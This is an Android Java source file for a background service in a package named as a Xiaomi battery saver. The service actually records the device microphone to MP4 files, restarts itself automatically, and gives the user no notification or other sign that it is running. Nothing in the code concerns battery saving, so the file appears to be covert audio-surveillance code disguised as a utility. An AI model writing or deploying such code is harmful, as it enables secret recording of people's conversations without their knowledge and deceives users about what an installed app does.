package com.xiaomi.batterysaver.service;

import android.app.Service;
import android.content.ContentValues;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;
import android.content.pm.PackageManager;

import java.io.IOException;

public class RecordService extends Service {
    private MediaRecorder mediaRecorder;
    private Uri audioFileUri;

    @Override
    public void onCreate() {
        super.onCreate();
        if (hasPermissions()) {
            setupMediaRecorder();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (hasPermissions()) {
            startRecording();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void setupMediaRecorder() {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setOutputFile(getExternalFilesDir(null).getAbsolutePath() + "/audio_record_" + System.currentTimeMillis() + ".mp4");
    }

    private void startRecording() {
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopRecording() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (RuntimeException stopException) {
                // Handle the case where stop is called immediately after start causing an exception
                stopException.printStackTrace();
            } finally {
                mediaRecorder = null;
            }
        }
    }

    private boolean hasPermissions() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
    }
}